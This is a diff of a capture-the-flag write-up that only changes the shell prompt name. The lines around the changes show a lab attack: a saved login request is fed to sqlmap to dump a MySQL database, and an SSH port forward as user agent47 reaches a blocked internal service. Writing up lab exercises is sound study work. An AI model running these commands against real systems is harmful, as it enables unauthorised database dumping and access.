@@ -28,9 +28,9 @@ now we gonna use SQLmap which is a automatic SQL injection and database takeover
 copy all reqest header and save it in a .txt file. we will use it in SQLmap.
 
 ```console
-kali@kali:~/THM/game$ ls
+bibo318@parrot:~/THM/game$ ls
 req.txt
-kali@kali:~/THM/game$ head req.txt 
+bibo318@parrot:~/THM/game$ head req.txt 
 POST /portal.php HTTP/1.1
 Host: 10.10.102.254
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
@@ -41,7 +41,7 @@ Referer: http://10.10.102.254/portal.php
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 28
 Connection: close
-kali@kali:~/THM/game$ sqlmap -r req.txt --dbms=mysql --dump
+bibo318@parrot:~/THM/game$ sqlmap -r req.txt --dbms=mysql --dump
 ```
 you will get 2 table.
 1. post: contains all game review
@@ -86,7 +86,7 @@ If a site was blocked, you can forward the traffic to a server you own and view 
 
 on kali
 ```console
-kali@kali:~/THM/game$ ssh -L 9999:localhost:10000 agent47@$IP
+bibo318@parrot:~/THM/game$ ssh -L 9999:localhost:10000 agent47@$IP
 ```
 now visite localhost:9999. I tried to loging with defualt credential but it didnt works. I then try using agent47 credential. Bingo !
 
